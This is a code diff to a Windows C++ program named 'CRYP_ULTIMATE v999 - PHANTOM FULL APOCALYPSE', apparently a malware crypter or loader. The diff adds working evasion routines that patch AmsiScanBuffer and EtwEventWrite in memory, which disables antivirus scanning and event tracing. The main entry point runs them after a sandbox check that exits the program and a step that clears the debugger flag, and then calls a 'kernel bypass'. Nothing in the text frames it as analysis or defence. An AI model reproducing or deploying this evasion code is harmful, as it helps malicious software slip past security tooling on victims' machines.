@@ -1,5 +1,6 @@
 // =============================================
 // CRYP_ULTIMATE v999 - PHANTOM FULL APOCALYPSE
+// Полная версия с AMSI + ETW bypass
 // =============================================
 
 #define _WIN32_WINNT 0x0601
@@ -12,7 +13,7 @@
 #include <random>
 #include <map>
 
-// ==================== ANTIDETECT ====================
+// ==================== ANTIDETECT + AMSI + ETW ====================
 class AntiDetect {
 public:
     bool is_sandbox() {
@@ -26,6 +27,23 @@ public:
     void hide_debug() {
         auto peb = (uint8_t*)__readgsqword(0x60);
         peb[2] = 0;
+    }
+    void patch_amsi() {
+        auto amsi = LoadLibraryW(L"amsi.dll");
+        auto addr = GetProcAddress(amsi, "AmsiScanBuffer");
+        DWORD old;
+        VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);
+        static const uint8_t patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
+        memcpy(addr, patch, 6);
+        VirtualProtect(addr, 6, old, &old);
+    }
+    void patch_etw() {
+        auto ntdll = GetModuleHandleW(L"ntdll.dll");
+        auto addr = GetProcAddress(ntdll, "EtwEventWrite");
+        DWORD old;
+        VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
+        *(uint8_t*)addr = 0xC3;
+        VirtualProtect(addr, 1, old, &old);
     }
 };
 
@@ -86,6 +104,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     AntiDetect ad;
     if (ad.is_sandbox()) ExitProcess(0);
     ad.hide_debug();
+    ad.patch_amsi();
+    ad.patch_etw();
 
     KernelBypass kb;
     kb.full_bypass();
